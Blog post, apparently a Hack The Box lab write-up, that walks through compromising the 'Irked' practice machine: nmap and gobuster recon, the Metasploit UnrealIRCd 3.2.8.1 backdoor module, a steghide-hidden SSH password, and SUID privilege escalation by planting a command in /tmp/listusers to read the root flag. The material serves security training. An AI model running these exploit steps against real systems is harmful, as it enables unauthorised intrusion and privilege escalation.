@@ -1,0 +1,476 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <title>Chalk | Irked - 10.10.10.117</title>
+  <meta name="description" content="A write-up of Hack the Box's Irked machine.">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <meta property="og:title" content="Irked - 10.10.10.117">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="http://chalk.nielsenramon.com/posts/htb-irked">
+  <meta property="og:description" content="A write-up of Hack the Box's Irked machine.">
+  <meta property="og:site_name" content="Chalk">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:url" content="http://chalk.nielsenramon.com/posts/htb-irked">
+  <meta name="twitter:title" content="Irked - 10.10.10.117">
+  <meta name="twitter:description" content="A write-up of Hack the Box's Irked machine.">
+
+  
+    <meta property="og:image" content="http://chalk.nielsenramon.com/assets/og-image-ee46bbc61b334e821e81534b1fd43f3fee6f020ec174b3c2114445695fd48c01.jpg">
+    <meta name="twitter:image" content="http://chalk.nielsenramon.com/assets/og-image-ee46bbc61b334e821e81534b1fd43f3fee6f020ec174b3c2114445695fd48c01.jpg">
+  
+
+  <link href="http://chalk.nielsenramon.com/feed.xml" type="application/rss+xml" rel="alternate" title="Chalk Last 10 blog posts" />
+
+  
+
+  
+
+    
+      <link rel="icon" type="image/x-icon" href="/assets/favicon-light-a98c41efc5ed9fcc06ac664c9e2f7a9b3c3b2e0a52357d221fe382f6f4abc8fc.ico">
+      <link rel="apple-touch-icon" href="/assets/apple-touch-icon-light-87d1f2a3a19b1500e5c1626a0492025ca5f7f97d24540dc5900288e92112925a.png">
+      <link rel="stylesheet" type="text/css" href="/assets/light-bb1553a18d0f1ccfe1aabc010584c49b4277a88503216b78906ba719e30019c1.css">
+    
+
+  
+
+</head>
+
+<body>
+  <main>
+    <div class="grid grid-centered">
+      <div class="grid-cell">
+        <nav class="header-nav scrollappear">
+  <a href="/" class="header-logo" title="Chalk">Chalk</a>
+  <ul class="header-links">
+    
+      <li>
+        <a href="/about" title="About me">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-about">
+  <use href="/assets/about-ecf154b571ab8034ae00aeed91a3b7ad68db80b46d958753ad6216c919486e88.svg#icon-about" xlink:href="/assets/about-ecf154b571ab8034ae00aeed91a3b7ad68db80b46d958753ad6216c919486e88.svg#icon-about"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+      <li>
+        <a href="https://twitter.com/nielsenramon" rel="noreferrer noopener" target="_blank" title="Twitter">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-twitter">
+  <use href="/assets/twitter-8842c33965263ad1b03a978406826677a668f94125d5837e70ab83f24b3213a7.svg#icon-twitter" xlink:href="/assets/twitter-8842c33965263ad1b03a978406826677a668f94125d5837e70ab83f24b3213a7.svg#icon-twitter"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+      <li>
+        <a href="https://github.com/nielsenramon" rel="noreferrer noopener" target="_blank" title="GitHub">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-github">
+  <use href="/assets/github-094f81040819f34343ee6ffff0980f17e2807b08b595eaaf66ae3554934fd78d.svg#icon-github" xlink:href="/assets/github-094f81040819f34343ee6ffff0980f17e2807b08b595eaaf66ae3554934fd78d.svg#icon-github"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+    
+    
+    
+    
+      <li>
+        <a href="https://dribbble.com/nielsenramon" rel="noreferrer noopener" target="_blank" title="Dribbble">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-dribbble">
+  <use href="/assets/dribbble-13bac13b56f8cd7edb821f8a51d199f6c5867b8ec835d226b27d54a05374ef88.svg#icon-dribbble" xlink:href="/assets/dribbble-13bac13b56f8cd7edb821f8a51d199f6c5867b8ec835d226b27d54a05374ef88.svg#icon-dribbble"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+      <li>
+        <a href="/feed.xml" rel="noreferrer noopener" target="_blank" title="RSS">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-rss">
+  <use href="/assets/rss-541ec5cea9cefd10d2fcfec01888f3f231a8829940249835fa7b7b3a12ae0d0d.svg#icon-rss" xlink:href="/assets/rss-541ec5cea9cefd10d2fcfec01888f3f231a8829940249835fa7b7b3a12ae0d0d.svg#icon-rss"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+  </ul>
+</nav>
+
+
+
+        <article class="article scrollappear">
+          <header class="article-header">
+            <h1>Irked - 10.10.10.117</h1>
+            <p>A write-up of Hack the Box's Irked machine.</p>
+            <div class="article-list-footer">
+  <span class="article-list-date">
+    April 1, 2020
+  </span>
+  <span class="article-list-divider">-</span>
+  <span class="article-list-minutes">
+    
+    
+      6 minute read
+    
+  </span>
+  <span class="article-list-divider">-</span>
+  <div class="article-list-tags">
+    
+      
+      <a href="/tag/HTB" title="See all posts with tag ''"></a>
+    
+      
+      <a href="/tag/Write-Up" title="See all posts with tag ''"></a>
+    
+      
+      <a href="/tag/Pentest" title="See all posts with tag ''"></a>
+    
+      
+      <a href="/tag/Lab" title="See all posts with tag ''"></a>
+    
+  </div>
+</div>
+          </header>
+
+          <div class="article-content">
+            <h1 id="irked---101010117">Irked - 10.10.10.117</h1>
+
+<h3 id="abstract">Abstract</h3>
+
+<p>This short write-up will cover Hack The Box’s machine, Irked. The box is a vulnerable server with
+numerous open ports leaving multiple entry points. Initial access to the machine is gained through
+exploiting an outdated version of an IRC service, user and root access are then followed shortly after.
+The write-up will cover recon and initial exploitation, exploitation to user, and privilege escalation
+to root.</p>
+
+<p>[TOC]</p>
+
+<h3 id="tools">Tools</h3>
+
+<ul>
+  <li><a href="https://www.kali.org/downloads/">Kali Linux</a></li>
+  <li><a href="https://nmap.org/">Nmap</a></li>
+  <li><a href="https://github.com/OJ/gobuster">Gobuster</a></li>
+  <li><a href="https://www.metasploit.com/">Metasploit</a></li>
+  <li><a href="http://steghide.sourceforge.net/">Steghide</a></li>
+</ul>
+
+<h2 id="reconnaissance">Reconnaissance</h2>
+
+<h3 id="nmap">NMAP</h3>
+
+<p>The first tool ran against Irked is NMAP. This tool scans the server for open ports and the services
+that are using them. The below command is executed:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p-</span> 10.10.10.117
+</code></pre></div></div>
+
+<p>The following is returned (I snipped out some of the extraneous information):</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Nmap scan report <span class="k">for </span>10.10.10.117
+Host is up <span class="o">(</span>0.18s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65493 closed ports, 35 filtered ports
+PORT
+STATE SERVICE VERSION
+22/tcp
+open ssh
+OpenSSH 6.7 p1 Debian 5+ deb8u4 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+80/tcp
+open http
+Apache httpd 2.4.10 <span class="o">((</span>Debian<span class="o">))</span>
+| _http-server-header: Apache /2.4.10 <span class="o">(</span>Debian<span class="o">)</span>
+| _http-title: Site doesn<span class="s1">'t have a title (text/html).
+111/tcp
+111/ tcp rpcbind
+111/ udp rpcbind
+58199/tcp status
+59248/udp status
+6697/tcp open irc
+UnrealIRCd
+8067/tcp open irc
+UnrealIRCd
+58199/tcp open status 1 (RPC # 100024)
+65534/tcp open irc
+UnrealIRCd
+Service Info: Host: irked.htb; OS: Linux;
+CPE: cpe: /o: linux: linux_kernel
+</span></code></pre></div></div>
+
+<p>From the scan, we see that there are several ports open. Most notably: 22, 80, 6697, 8067, and
+65534.</p>
+
+<p>Port 22 is running OpenSSH 6.7p1 for Debian, port 80 is running Apache 2.4.10.</p>
+
+<p>Ports 6697, 8067 and 65534 are running UnrealIRCd.</p>
+
+<p>Ports 111 and 58199 are utilized by RPC.</p>
+
+<h3 id="gobuster">Gobuster</h3>
+
+<p>Another tool that can be used in the reconnaissance stage, is <code class="highlighter-rouge">gobuster</code> or <code class="highlighter-rouge">dirbuster</code>. For this particular box, I ran <code class="highlighter-rouge">gobuster</code>. The below command is executed:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster <span class="nt">-e</span> <span class="nt">-u</span> http ://10.10.10.117
+</code></pre></div></div>
+
+<p>The following will be returned:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">=====================================================</span>
+Gobuster v2 .0.1
+OJ Reeves <span class="o">(</span> @TheColonial <span class="o">)</span>
+<span class="o">=====================================================</span>
+<span class="o">[</span>+] Mode
+: <span class="nb">dir</span>
+<span class="o">[</span>+] Url/Domain
+: http://10.10.10.117/
+<span class="o">[</span>+] Threads
+: 30
+<span class="o">[</span>+] Wordlist
+: /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+<span class="o">[</span>+] Status codes : 200,204,301,302,307,403
+<span class="o">[</span>+] Expanded
+: <span class="nb">true</span>
+<span class="o">[</span>+] Timeout
+: 10s
+<span class="o">=====================================================</span>
+2019/02/20 15:07:50 Starting gobuster
+<span class="o">=====================================================</span>
+http://10.10.10.117/manual <span class="o">(</span>Status:301<span class="o">)</span>
+<span class="o">=====================================================</span>
+2019/02/20 15:15:58 Finished
+<span class="o">=====================================================</span>
+</code></pre></div></div>
+
+<p>In this case, the <code class="highlighter-rouge">gobuster</code> results return nothing too relevant. We could proceed with a larger
+directory list, however for Irked, we will not be gaining access through port 80.</p>
+
+<h2 id="exploitation">Exploitation</h2>
+
+<h3 id="low-privilege-shell-via-unrealircd">Low Privilege Shell via UnrealIRCd</h3>
+
+<p>From our NMAP scans, we know that there is an IRC server running. Let’s try to connect, shall we?
+Connecting to the IRC server using port 65534 via HexChat granted access with no authentication,
+and we are greeted with the following MOTD in IRC:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span> Welcome to the ROXnet IRC Network root_!root@10.10.<span class="k">**</span>.<span class="k">***</span>
+<span class="k">*</span> Your host is irked.htb, running version Unreal3.2.8.1
+<span class="k">*</span> This server was created Mon May 14 2018 at 13:12:50 EDT
+<span class="k">*</span> irked.htb Unreal3.2.8.1 iowghraAsORTVSxNCWqBzvdHtGp
+</code></pre></div></div>
+
+<p>Score. The MOTD of the IRC channel displays the UnrealIRCd version number: <code class="highlighter-rouge">Unreal 3.2.8.1</code>
+A quick exploit-db search yields the following: https://www.exploit-db.com/exploits/16922
+Examination of this exploit, we realize it is a <code class="highlighter-rouge">Metasploit</code> module. Let’s fire up <code class="highlighter-rouge">Metasploit</code> with the
+following command: <code class="highlighter-rouge">msfdb run</code></p>
+
+<p>Now that we have Metasploit running, let’s use the exploit with the following command:</p>
+
+<p><code class="highlighter-rouge">msf5&gt; use exploit/unix/irc/unreal_ircd_3281_backdoor</code></p>
+
+<p>Now let’s configure and run the exploit using the following commands below:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf5 exploit <span class="o">(</span>unreal_ircd_3281_backdoor<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>RHOSTS 10.10.10.117
+msf5 exploit <span class="o">(</span>unreal_ircd_3281_backdoor<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>RPORT 65534
+msf5 exploit <span class="o">(</span>unreal_ircd_3281_backdoor<span class="o">)</span> <span class="o">&gt;</span> exploit
+</code></pre></div></div>
+
+<p>We are now a low privilege shell on the box. Running <code class="highlighter-rouge">whoami</code> tells us that we are ircd, and id tells
+us that we are <code class="highlighter-rouge">uid=1001(ircd) gid=1001(ircd) groups=1001(ircd)</code>. We can spawn a TTY shell
+and begin further exploitation. Woohoo!</p>
+
+<h3 id="user-access-via-low-privilege-shell">User Access via Low Privilege Shell</h3>
+
+<p>With our new found low privilege shell access, we can begin enumerating all directories and files
+that we have access to. Using cd, we navigate to <code class="highlighter-rouge">/home/</code> where we see that we have access to two
+users: <code class="highlighter-rouge">djmardov</code> and ircd. Let’s inspect <code class="highlighter-rouge">djmardov</code>. Perform the following commands below:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cd</span> /home/djmardov/Documents
+<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-a</span>
+</code></pre></div></div>
+
+<p>Using <code class="highlighter-rouge">ls -a</code>, we notice there are two files in the documents directory, <code class="highlighter-rouge">.backup</code> and <code class="highlighter-rouge">user.txt</code>. The
+<code class="highlighter-rouge">user.txt</code> file is the user flag, however we do not have permissions to read the file. <code class="highlighter-rouge">.backup</code>, on the
+other hand, is readable. We use <code class="highlighter-rouge">cat</code> to read the file: <code class="highlighter-rouge">$ cat /home/djmardov/Documents/.backup</code></p>
+
+<p>Returns:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Super elite steg backup pw
+UPupDOWNdownLRlrBAbaSSss
+</code></pre></div></div>
+
+<p>Steg? Perhaps steganography is in play here. <a href="https://en.wikipedia.org/wiki/Steganography">Steganography</a> is the act of hiding information in plain
+sight, typically in media files. Thinking back to port 80, <code class="highlighter-rouge">index.html</code> had an image on it. Let’s give
+it a shot. Download the image from the homepage, <code class="highlighter-rouge">irked.jpg</code>, and let’s run <code class="highlighter-rouge">steghide</code> on it, using
+<code class="highlighter-rouge">UPupDOWNdownLRlrBAbaSSss</code> as the password.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>steghide extract <span class="nt">-sf</span> irked.jpg
+Enter passphrase: UPupDOWNdownLRlrBAbaSSss
+wrote extracted data to <span class="s2">"pass.txt"</span><span class="nb">.</span>
+</code></pre></div></div>
+
+<p><code class="highlighter-rouge">pass.txt</code> contains the value <code class="highlighter-rouge">Kab6h+m+bbp2J:HG</code>. This is the SSH password for <code class="highlighter-rouge">djmardov</code>. Let’s
+proceed with logging in as the user with the following commands below:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# ssh djmardov@10.10.10.117
+djmardov@10.10.10.117’s password: Kab6h+m+bbp2J:HG
+</code></pre></div></div>
+
+<p>We’re in. Let’s grab the user flag from earlier, <code class="highlighter-rouge">user.txt</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>djmardov@irked:~<span class="nv">$ </span><span class="nb">cat</span> /home/djmardov/Documents/user.txt
+4 a66a78b12dc0e661a59d3f5<span class="k">********</span>
+</code></pre></div></div>
+
+<h3 id="privilege-escalation-to-root">Privilege Escalation to Root</h3>
+
+<p>For this privilege escalation exploit, enumeration is key. One of the best places to start enumeration
+is the <code class="highlighter-rouge">SUID binaries</code>. Let’s find all of the active <code class="highlighter-rouge">SUID binaries</code> by running the below:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>djmardov@irked:~<span class="nv">$ </span>find / <span class="nt">-perm</span> <span class="nt">-u</span><span class="o">=</span>s <span class="nt">-type</span> f 2&gt;/dev/null
+</code></pre></div></div>
+
+<p>Returns:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
+/usr/sbin/exim4
+/usr/sbin/pppd
+/usr/bin/chsh
+/usr/bin/procmail
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/at
+/usr/bin/pkexec
+/usr/bin/X
+/usr/bin/passwd
+/usr/bin/chfn
+/usr/bin/viewuser
+/sbin/mount.nfs
+/bin/su
+/bin/mount
+/bin/fusermount
+/bin/ntfs-3g
+/bin/umount
+</code></pre></div></div>
+
+<p>We will then begin enumerating the binaries. We inspect each binary against public exploits, but
+also utilizing <code class="highlighter-rouge">strings</code> and other enumeration tool in kali. We do this for all binaries until we hit
+<code class="highlighter-rouge">viewuser</code>. This binary is not a native Debian <code class="highlighter-rouge">SUID binary</code>, which is suspicious. We execute the
+binary and see the following:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>djmardov@irked:~<span class="nv">$ </span>viewuser
+This application is being developed to <span class="nb">set </span>and <span class="nb">test </span>user permissions
+It is still being actively developed
+<span class="o">(</span>unknown<span class="o">)</span>:0
+2019-02-20 15:59 <span class="o">(</span>:0<span class="o">)</span>
+djmardov pts /1
+2019-02-20 16:01 <span class="o">(</span>10.10.<span class="k">**</span>.<span class="k">**</span><span class="o">)</span>
+sh: 1: /tmp/listusers: not found
+</code></pre></div></div>
+
+<p>This looks like a custom binary that runs who along with some other instructions. The last line of
+the output tells us that the <code class="highlighter-rouge">SUID binary</code> is reading <code class="highlighter-rouge">/tmp/listusers</code>. Let’s go check it out.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>djmardov@irked:~<span class="nv">$ </span><span class="nb">cd</span> /tmp/
+djmardov@irked:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-a</span>
+</code></pre></div></div>
+
+<p>Nothing! Looks like <code class="highlighter-rouge">listusers</code> hasn’t been created. Let’s create it and set permissions- and while we’re at it, let’s try to get <code class="highlighter-rouge">viewuser</code> to execute a command for us.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>djmardov@irked:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"cat /root/root.txt"</span> <span class="o">&gt;</span> /tmp/listusers
+djmardov@irked:~<span class="nv">$ </span><span class="nb">chmod</span> +755 listusers
+</code></pre></div></div>
+
+<p>Nice. Let’s see what this does when we execute <code class="highlighter-rouge">viewuser</code> now.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>djmardov@irked:~<span class="nv">$ </span>viewuser
+This application is being developed to <span class="nb">set </span>and <span class="nb">test </span>user permissions
+It is still being actively developed
+<span class="o">(</span>unknown<span class="o">)</span>:0
+2019-02-20 15:59 <span class="o">(</span>:0<span class="o">)</span>
+djmardov pts /1
+2019-02-20 16:01 <span class="o">(</span>10.10.<span class="k">**</span>.<span class="k">**</span><span class="o">)</span>
+8 d8e9e8be64654b6dccc3bff<span class="k">********</span>
+</code></pre></div></div>
+
+<p>Success! <code class="highlighter-rouge">sh: 1: /tmp/listusers: not found</code> has successfully changed tot he contents of <code class="highlighter-rouge">/root/root.txt</code>. Based on this finding, we can easily modify <code class="highlighter-rouge">/tmp/listusers</code> with shell code which will allow a full root shell.</p>
+
+          </div>
+          <div class="article-share">
+            
+            
+            <a href="https://twitter.com/home?status=Irked+-+10.10.10.117%20-%20http://chalk.nielsenramon.com/posts/htb-irked%20by%20@nielsenramon" title="Share on Twitter" rel="noreferrer noopener" target="_blank">
+              <svg viewBox="0 0 512 512"><path d="M492 109.5c-17.4 7.7-36 12.9-55.6 15.3 20-12 35.4-31 42.6-53.6 -18.7 11.1-39.4 19.2-61.5 23.5C399.8 75.8 374.6 64 346.8 64c-53.5 0-96.8 43.4-96.8 96.9 0 7.6 0.8 15 2.5 22.1 -80.5-4-151.9-42.6-199.6-101.3 -8.3 14.3-13.1 31-13.1 48.7 0 33.6 17.2 63.3 43.2 80.7C67 210.7 52 206.3 39 199c0 0.4 0 0.8 0 1.2 0 47 33.4 86.1 77.7 95 -8.1 2.2-16.7 3.4-25.5 3.4 -6.2 0-12.3-0.6-18.2-1.8 12.3 38.5 48.1 66.5 90.5 67.3 -33.1 26-74.9 41.5-120.3 41.5 -7.8 0-15.5-0.5-23.1-1.4C62.8 432 113.7 448 168.3 448 346.6 448 444 300.3 444 172.2c0-4.2-0.1-8.4-0.3-12.5C462.6 146 479 129 492 109.5z"/></svg>
+            </a>
+            <a href="https://www.facebook.com/sharer/sharer.php?u=http://chalk.nielsenramon.com/posts/htb-irked" title="Share on Facebook" rel="noreferrer noopener" target="_blank">
+              <svg viewBox="0 0 512 512"><path d="M288 192v-38.1c0-17.2 3.8-25.9 30.5-25.9H352V64h-55.9c-68.5 0-91.1 31.4-91.1 85.3V192h-45v64h45v192h83V256h56.4l7.6-64H288z"/></svg>
+            </a>
+          </div>
+
+          
+            <div id="disqus_thread" class="article-comments"></div>
+            <script src="https://chalk-1.disqus.com/embed.js" async defer></script>
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+          
+        </article>
+        <footer class="footer scrollappear">
+  <p>
+    Chalk is a high quality, completely customizable, performant and 100% free
+    blog template for Jekyll built by
+    <a href="/about" title="About me">Nielsen Ramon</a>. Download it <a href="https://github.com/nielsenramon/chalk" rel="noreferrer noopener" target="_blank" title="Download Chalk">here</a>.
+  </p>
+</footer>
+
+      </div>
+    </div>
+  </main>
+  
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-28631876-6"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'UA-28631876-6');
+  </script>
+
+
+<script type="text/javascript" src="/assets/vendor-130c9c254effc51f3283620bc635851da7b99c20901216948f11ba72ee13317f.js"></script>
+
+
+  <script type="text/javascript" src="/assets/webfonts-96493456d319d1bf419afdf8701552d4d486fee6afd304897d4fd81eb4e0cc0b.js"></script>
+
+
+
+  <script type="text/javascript" src="/assets/scrollappear-e2da8ea567e418637e31266cc5302126eaa79f62a2273739086358b589a89ee6.js"></script>
+
+
+<script type="text/javascript" src="/assets/application-cfde13ac81ddaf4351b2e739603e2baf688d0fcc9aba613fe62bbb1c7b037fb9.js"></script>
+
+
+</body>
+</html>
